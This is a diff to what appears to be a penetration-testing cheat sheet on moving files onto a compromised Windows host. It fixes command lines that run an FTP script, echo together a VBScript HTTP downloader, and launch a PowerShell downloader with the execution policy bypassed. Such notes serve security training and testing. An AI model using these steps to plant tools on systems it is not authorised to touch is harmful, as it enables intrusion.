@@ -306,6 +306,7 @@ Run command
 
 ```
 ftp -i -v -n -s:ftp.txt
+ftp -n -s:ftp.txt - this one worked
 ```
 
 
@@ -324,7 +325,8 @@ echo Set http = Nothing >> wget.vbs
 echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
 echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
 echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
-echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs echo http.Open "GET", strURL, False >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs 
+echo http.Open "GET", strURL, False >> wget.vbs
 echo http.Send >> wget.vbs
 echo varByteArray = http.ResponseBody >> wget.vbs
 echo Set http = Nothing >> wget.vbs
@@ -333,7 +335,8 @@ echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
 echo strData = "" >> wget.vbs
 echo strBuffer = "" >> wget.vbs
 echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
-echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs echo Next >> wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs 
+echo Next >> wget.vbs
 echo ts.Close >> wget.vbs
 ```
 
@@ -356,7 +359,7 @@ echo $webclient.DownloadFile($url,$file) >>wget.ps1
 Run
 
 ```
- powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive - NoProfile -File wget.ps1
+ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 ```
 
 Powershell one liner
